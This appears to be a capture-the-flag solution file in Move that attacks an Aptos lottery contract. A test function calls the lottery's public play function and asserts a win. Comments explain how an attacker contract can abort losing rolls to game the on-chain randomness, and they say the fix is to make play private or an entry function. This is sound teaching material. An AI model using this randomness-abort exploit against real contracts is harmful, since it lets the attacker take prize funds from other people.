module ctf::attack{

    #[test_only]
    use std::error::not_implemented;
    #[test_only]
    use std::signer::address_of;
    #[test_only]
    use aptos_framework::randomness;
    #[test_only]
    use ctf::lottery::{play, has_won, get_prize};

    const LOSE :u64 =1;
    const E_price :u64 =2;

    #[lint::allow_unsafe_randomness]
    #[test(aptos_framework=@aptos_framework,caller=@ctf)]
    public fun attack(aptos_framework:&signer,caller:&signer){
        randomness::initialize(aptos_framework);
        play(caller);
        assert!(has_won(address_of(caller)),not_implemented(LOSE));
        assert!( get_prize(address_of(caller)) == 1000 ,not_implemented(E_price));

        ///method
        /// Because the developer did not set the play function to private or entry fun,
        /// the hacker was able to utilize another contract.For example,
        /// when the attacker calls the play function,
        /// he can verify if he won and if not, abort to reset everything.

        /// #[lint::allow_unsafe_randomness]
        //     (public entry fun)/fun play(user: &signer) {
        //         let random_value = randomness::u64_range(0, 100);
        //         if (random_value == 42) {
        //             mint_win_to_user(user, 1000);
        //         }
        //     }
        /// make this fun only allow call by aptos sdk or private
    }
}